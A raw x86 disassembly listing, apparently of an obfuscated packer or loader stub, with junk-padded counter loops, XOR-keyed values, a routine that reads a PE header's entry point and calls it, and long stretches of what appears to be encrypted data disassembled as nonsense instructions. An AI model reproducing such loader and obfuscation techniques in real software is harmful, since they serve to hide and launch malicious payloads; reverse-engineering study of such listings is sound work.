  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x4302d1,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x43036b,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ec63,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x4302e9,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x430363,0x4302f1
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x4302b9,0x1e
  40953f:	cmp    DWORD PTR ds:0x4302b9,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x4302b9,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e65c
  409566:	call   DWORD PTR ds:0x42e877
  40956c:	mov    eax,ds:0x4302b9
  409571:	dec    eax
  409572:	mov    ds:0x4302b9,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430309
  409582:	mov    eax,ds:0x430393
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x43034f,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e658,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x4302c1,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x4302c1
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x4302c1,edx
  4095e8:	cmp    DWORD PTR ds:0x4302c1,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e74d
  409617:	call   DWORD PTR ds:0x42e87b
  40961d:	cmp    DWORD PTR ds:0x4302c1,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e648,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e648
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e648,ecx
  40964a:	cmp    DWORD PTR ds:0x42e648,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42eaaf
  409672:	cmp    DWORD PTR ds:0x42e648,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e644
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x4302dd,0x14
  4098db:	cmp    DWORD PTR ds:0x4302dd,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x4302dd,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42eab3
  40991f:	mov    eax,ds:0x4302dd
  409924:	dec    eax
  409925:	mov    ds:0x4302dd,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x430357
  409934:	or     eax,DWORD PTR ds:0x43035f
  40993a:	mov    ds:0x430357,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e650,0x13
  40994c:	cmp    DWORD PTR ds:0x42e650,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e650,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42eab7
  409979:	mov    ecx,DWORD PTR ds:0x42e650
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e650,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x4302c9,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x4302d9,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x43034f,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x43034f
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x43034f,edi
  4099bf:	cmp    DWORD PTR ds:0x43034f,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x4302bd
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42e947
  4099e8:	cmp    DWORD PTR ds:0x43034f,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x43034f
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x43034f,edi
  409a02:	cmp    DWORD PTR ds:0x43034f,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x43035f,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x4302b5,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x4302b5
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x4302b5,ebx
  409a35:	cmp    DWORD PTR ds:0x4302b5,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42e883
  409a50:	cmp    DWORD PTR ds:0x4302b5,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x4302b5
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x4302b5,ebx
  409a6a:	cmp    DWORD PTR ds:0x4302b5,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e648
  409a7d:	or     DWORD PTR ds:0x42ec4b,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	mov    DWORD PTR [ebx+0x19],ebx
  409a97:	loope  0x409af2
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409a9c
  409aa1:	mov    al,ds:0xcc9ab454
  409aa6:	adc    eax,0x2e24bd1a
  409aab:	add    DWORD PTR gs:[edx],ebx
  409aae:	mov    bh,0x36
  409ab0:	repnz lock stc 
  409ab3:	mov    ds:0xb990f44b,eax
  409ab8:	jbe    0x409a4a
  409aba:	push   ds
  409abb:	mov    dh,0xf2
  409abd:	loope  0x409aae
  409abf:	push   cs
  409ac0:	rcr    DWORD PTR [ebx+0x4d],1
  409ac3:	and    BYTE PTR [ecx-0x14],dh
  409ac6:	or     BYTE PTR [ebp+0x73],ch
  409ac9:	es retf 0x4bc6
  409acd:	lahf   
  409ace:	pop    ecx
  409acf:	outs   dx,BYTE PTR ds:[esi]
  409ad0:	xchg   esi,eax
  409ad1:	ss mov bx,0xac2a
  409ad6:	outs   dx,BYTE PTR ds:[esi]
  409ad7:	push   edi
  409ad8:	mov    ds,WORD PTR [edi]
  409ada:	sbb    cl,0xaf
  409add:	inc    esi
  409ade:	ret    
  409adf:	xchg   edx,eax
  409ae0:	adc    esi,DWORD PTR [ebp+0x648af0cc]
  409ae6:	inc    eax
  409ae7:	cmp    DWORD PTR [edx+0x2b],ecx
  409aea:	and    bh,BYTE PTR [edi]
  409aec:	xchg   esp,eax
  409aed:	adc    DWORD PTR [ecx+0x350c700e],0x73
  409af4:	push   edx
  409af5:	pop    eax
  409af6:	int    0x84
  409af8:	stos   DWORD PTR es:[edi],eax
  409af9:	enter  0x3f5d,0x92
  409afd:	or     BYTE PTR [edx],cl
  409aff:	fistp  WORD PTR [eax-0x1487e01a]
  409b05:	jl     0x409b2c
  409b07:	shl    edi,0x8e
  409b0a:	ss dec ebp
  409b0c:	sbb    BYTE PTR [ebp+0x286276f4],al
  409b12:	mov    ah,0xb
  409b14:	add    BYTE PTR [edx],0x18
  409b17:	xor    ebx,edx
  409b19:	(bad)  
  409b1a:	arpl   si,dx
  409b1c:	sub    cl,BYTE PTR [eax+esi*4+0x75]
  409b20:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b22:	shl    bl,1
  409b24:	mov    dh,0x60
  409b26:	inc    DWORD PTR [esi]
  409b28:	sbb    BYTE PTR [edi+0x32],0xcf
  409b2c:	dec    ecx
  409b2d:	pop    es
  409b2e:	aaa    
  409b2f:	xor    al,0x60
  409b31:	lea    ecx,ds:0x5245c2a9
  409b37:	pop    ebp
  409b38:	ss lock cdq 
  409b3b:	add    eax,0x6e15b5b7
  409b40:	int3   
  409b41:	mov    ds:0x3bd09a43,al
  409b46:	loopne 0x409b8a
  409b48:	loopne 0x409b43
  409b4a:	pushf  
  409b4b:	sbb    BYTE PTR [edx-0x4b5cbe96],dl
  409b51:	iret   
  409b52:	je     0x409bc8
  409b54:	stos   BYTE PTR es:[edi],al
  409b55:	or     cl,BYTE PTR [ecx-0x4c]
  409b58:	cld    
  409b59:	lea    edi,[eax+0x3c]
  409b5c:	xchg   ebp,eax
  409b5d:	inc    edi
  409b5e:	test   al,0x3e
  409b60:	int    0xf5
  409b62:	xchg   edx,eax
  409b63:	add    al,0x3c
  409b65:	pop    ss
  409b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b67:	call   0x6368:0xccacc3a4
  409b6e:	scas   eax,DWORD PTR es:[edi]
  409b6f:	pop    ds
  409b70:	in     al,dx
  409b71:	(bad)  
  409b72:	popa   
  409b73:	fsub   DWORD PTR [ebx]
  409b75:	inc    ebx
  409b76:	nop
  409b77:	sub    al,0x3
  409b79:	add    BYTE PTR [esi+edi*4-0x34f1d73a],dh
  409b80:	inc    ebx
  409b81:	xor    DWORD PTR [eax-0x36b3e7e6],0x1f43b817
  409b8b:	aas    
  409b8c:	adc    eax,0x2d
  409b8f:	gs loope 0x409bbe
  409b92:	mov    cl,0xbd
  409b94:	xchg   edx,eax
  409b95:	enter  0xd362,0x2a
  409b99:	sub    al,0x6c
  409b9b:	mov    bl,0x80
  409b9d:	lahf   
  409b9e:	adc    eax,0x26c966ac
  409ba3:	mov    edi,0x7ae3d606
  409ba8:	cmc    
  409ba9:	xor    DWORD PTR [eax],0x22
  409bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bad:	(bad)  [ebx-0x56]
  409bb0:	dec    esi
  409bb1:	icebp  
  409bb2:	fild   WORD PTR [eax]
  409bb4:	jns    0x409b7c
  409bb6:	xor    DWORD PTR [ecx+0x3c8d24b],0xffffffb8
  409bbd:	jg     0x409bfa
  409bbf:	inc    eax
  409bc0:	popa   
  409bc1:	data16 fst st(5)
  409bc4:	adc    BYTE PTR [ebp+eax*2+0x528701e4],al
  409bcb:	nop
  409bcc:	and    al,0x23
  409bce:	xor    eax,0x96378ef8
  409bd3:	or     esp,DWORD PTR [edx]
  409bd5:	sub    esi,DWORD PTR [edi+0x59]
  409bd8:	pop    ds
  409bd9:	iret   
  409bda:	stos   DWORD PTR es:[edi],eax
  409bdb:	mov    ds:0x6850755b,eax
  409be0:	sti    
  409be1:	inc    BYTE PTR [edi-0x4d2ddbac]
  409be7:	out    dx,al
  409be8:	push   cs
  409be9:	jp     0x409c21
  409beb:	sbb    al,0xbe
  409bed:	rcl    BYTE PTR gs:[esi],0xb8
  409bf1:	jmp    0x2e4f:0xf9cd9b1b
  409bf8:	(bad)  
  409bf9:	loope  0x409c47
  409bfb:	xor    eax,0x73828b26
  409c00:	bound  ebx,QWORD PTR [edi]
  409c02:	sub    al,dh
  409c04:	(bad)  
  409c05:	stc    
  409c06:	mov    dh,BYTE PTR [ebp+0x60]
  409c09:	pop    edi
  409c0a:	jp     0x409c01
  409c0c:	mov    ds:0xb498edf1,al
  409c11:	mov    ?,esp
  409c13:	mov    esi,0x733975d6
  409c18:	adc    BYTE PTR [edx-0x36],bh
  409c1b:	xchg   edx,eax
  409c1c:	add    ecx,DWORD PTR [ebx-0xb]
  409c1f:	cmc    
  409c20:	rcl    DWORD PTR [ebx-0x6f],cl
  409c23:	dec    edx
  409c24:	loopne 0x409baa
  409c26:	nop
  409c27:	jnp    0x409bc8
  409c29:	sub    DWORD PTR [eax+0x43],ecx
  409c2c:	dec    esp
  409c2d:	pop    edi
  409c2e:	mov    eax,ds:0x667b3b2b
  409c33:	ret    0xa88a
  409c36:	jns    0x409c4c
  409c38:	mov    al,dh
  409c3a:	jecxz  0x409bdc
  409c3c:	sub    cl,cl
  409c3e:	bound  edi,QWORD PTR [ebx+0x7f110bfb]
  409c44:	cmc    
  409c45:	adc    BYTE PTR [ebx-0x48],0x18
  409c49:	or     edx,DWORD PTR [ebx]
  409c4b:	mov    cl,0x8a
  409c4d:	ss in  eax,dx
  409c4f:	arpl   WORD PTR [ecx+0x1cb58ff8],sp
  409c55:	sub    dh,BYTE PTR [ebx-0x5]
  409c58:	stos   DWORD PTR es:[edi],eax
  409c59:	mov    bl,0x18
  409c5b:	ror    edi,0x7e
  409c5e:	or     cl,BYTE PTR [ebx+ebx*1]
  409c61:	cli    
  409c62:	scas   eax,DWORD PTR es:[edi]
  409c63:	aas    
  409c64:	mov    esi,0xd4ef4e54
  409c69:	push   es
  409c6a:	repz fdivr DWORD PTR ds:0x95ca0742
  409c71:	sbb    eax,0xaad50c99
  409c76:	pop    edi
  409c77:	jnp    0x409c0a
  409c79:	rcl    BYTE PTR [ebp+0x6a216769],0x91
  409c80:	cmp    cl,BYTE PTR [edx]
  409c82:	lahf   
  409c83:	sahf   
  409c84:	je     0x409c7b
  409c86:	mov    WORD PTR [edi+ecx*8+0x63],fs
  409c8a:	push   es
  409c8b:	and    BYTE PTR [ebx-0x3bd872bc],dl
  409c91:	adc    eax,0xdd53ee46
  409c96:	popa   
  409c97:	jmp    0x942c:0x5c17f9cf
  409c9e:	and    al,0x81
  409ca0:	mov    edx,0xf7b07d7d
  409ca5:	fisub  WORD PTR [ebx+0x5fc665e2]
  409cab:	(bad)  
  409cac:	sbb    eax,0x2fa71a31
  409cb1:	sub    esp,DWORD PTR [esi-0x5c572ef1]
  409cb7:	int    0x95
  409cb9:	test   al,0x26
  409cbb:	push   esp
  409cbc:	sbb    eax,0x4644a5e5
  409cc1:	ins    BYTE PTR es:[edi],dx
  409cc2:	jns    0x409cf3
  409cc4:	pop    esp
  409cc5:	push   ebx
  409cc6:	lea    esi,[ecx+0x9d93b4f]
  409ccc:	xchg   edx,eax
  409ccd:	inc    ebx
  409cce:	mov    ds:0x310208d6,eax
  409cd3:	ss push ebp
  409cd5:	add    DWORD PTR fs:[eax-0x6c371490],0x93b96a27
  409ce0:	mov    al,0xe2
  409ce2:	xchg   ecx,eax
  409ce3:	into   
  409ce4:	xor    BYTE PTR [ebp+0x416d6355],al
  409cea:	aam    0x5d
  409cec:	lods   al,BYTE PTR ds:[esi]
  409ced:	push   cs
  409cee:	pop    eax
  409cef:	jo     0x409c9a
  409cf1:	sbb    al,0x57
  409cf3:	dec    edx
  409cf4:	pushf  
  409cf5:	or     BYTE PTR [edi+0x67607630],0x69
  409cfc:	ds rcl cl,cl
  409cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d00:	xlat   BYTE PTR ds:[ebx]
  409d01:	or     DWORD PTR [ecx-0x55020400],edx
  409d07:	jle    0x409c89
  409d09:	pop    esp
  409d0a:	imul   esp,DWORD PTR ds:0x5872eb75,0x8
  409d11:	adc    ebp,ebx
  409d13:	mov    esp,0x5decade6
  409d18:	dec    esp
  409d19:	popf   
  409d1a:	sub    DWORD PTR [ebp-0x5],esi
  409d1d:	push   edx
  409d1e:	cwde   
  409d1f:	jl     0x409d3d
  409d21:	lahf   
  409d22:	jbe    0x409d64
  409d24:	xchg   edx,eax
  409d25:	mov    ah,0x62
  409d27:	inc    edx
  409d28:	or     esi,DWORD PTR [ecx-0x52c6f585]
  409d2e:	out    dx,eax
  409d2f:	inc    eax
  409d30:	aas    
  409d31:	lock inc edi
  409d33:	jae    0x409d91
  409d35:	out    dx,eax
  409d36:	fisttp DWORD PTR [ebx]
  409d38:	lds    esp,FWORD PTR [edx]
  409d3a:	loop   0x409d96
  409d3c:	xchg   ebp,eax
  409d3d:	rol    DWORD PTR [edx+ebx*2+0x47],cl
  409d41:	adc    eax,DWORD PTR [ebp+eax*1-0x52]
  409d45:	dec    edx
  409d46:	cmp    eax,0x7ff28af0
  409d4b:	retf   
  409d4c:	add    DWORD PTR [ebx+ebp*1-0x6a],ebx
  409d50:	pop    edi
  409d51:	retf   
  409d52:	cmp    DWORD PTR ds:0xc593efad,esp
  409d58:	out    0xdd,al
  409d5a:	loopne 0x409daa
  409d5c:	nop
  409d5d:	push   cs
  409d5e:	adc    al,BYTE PTR [di]
  409d61:	sbb    al,0x40
  409d63:	pushf  
  409d64:	bound  ebx,QWORD PTR [esi+0x78]
  409d67:	push   ebx
  409d68:	mov    esi,0xbc18c483
  409d6d:	icebp  
  409d6e:	loope  0x409d66
  409d70:	push   0xffffffc6
  409d72:	dec    esp
  409d73:	fbld   TBYTE PTR [eax]
  409d75:	dec    BYTE PTR [ebx+0x35]
  409d78:	repz mov cl,0x5c
  409d7b:	xor    al,al
  409d7d:	jmp    0x1c02:0xdf84d775
  409d84:	jo     0x409df1
  409d86:	fild   QWORD PTR [edi-0x62]
  409d89:	pop    ds
  409d8a:	enter  0x2b1b,0xd0
  409d8e:	in     eax,dx
  409d8f:	scas   eax,DWORD PTR es:[edi]
  409d90:	push   0x617c48d5
  409d95:	(bad)  
  409d96:	fistp  QWORD PTR [eax]
  409d98:	sbb    esp,DWORD PTR [ebx+0x5aec487f]
  409d9e:	test   DWORD PTR [ebx+0x7279c32],esi
  409da4:	xchg   edi,eax
  409da5:	das    
  409da6:	cwde   
  409da7:	mov    WORD PTR [edx+0x1b],cs
  409daa:	jle    0x409e1a
  409dac:	in     al,0x55
  409dae:	sub    BYTE PTR [ebp-0x26],0xc8
  409db2:	mov    es,WORD PTR [ebx+0x6b86cd01]
  409db8:	sbb    dh,BYTE PTR [ebx-0x218be9a]
  409dbe:	sbb    ebp,eax
  409dc0:	pop    esi
  409dc1:	push   cs
  409dc2:	fidivr WORD PTR [eax-0x30]
  409dc5:	leave  
  409dc6:	cmp    eax,0x12c096ee
  409dcb:	add    DWORD PTR [ebp+0x29],0xc7034a5f
  409dd2:	mov    ebx,DWORD PTR ds:0x42e658
  409dd8:	add    ebx,DWORD PTR ds:0x430357
  409dde:	mov    DWORD PTR ds:0x42e658,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x4302dd,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x43034f,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x4302d1
  409e03:	and    DWORD PTR ds:0x4302f1,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x4302cd,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e2f
  409e2b:	mov    esp,0xd80942c4
  409e30:	jle    0x409eb0
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e80
  409e37:	xchg   ebp,eax
  409e38:	pop    ecx
  409e39:	stos   DWORD PTR es:[edi],eax
  409e3a:	leave  
  409e3b:	xchg   esp,eax
  409e3c:	mov    edx,DWORD PTR [edx-0x7a38d692]
  409e42:	test   DWORD PTR ds:0x521eb3eb,ebp
  409e48:	and    eax,0xbc211c65
  409e4d:	jns    0x409e32
  409e4f:	xor    BYTE PTR ds:[esi+0xd190048],ah
  409e56:	adc    ebp,ebp
  409e58:	pop    ebx
  409e59:	mov    eax,0x9473eb6b
  409e5e:	cmp    BYTE PTR [edi],al
  409e60:	xor    DWORD PTR [esp+edi*2+0x2b3adb7e],0xfffffffc
  409e68:	dec    edx
  409e69:	pusha  
  409e6a:	and    BYTE PTR [esi+0x69],dl
  409e6d:	ins    DWORD PTR es:[edi],dx
  409e6e:	inc    edi
  409e6f:	aaa    
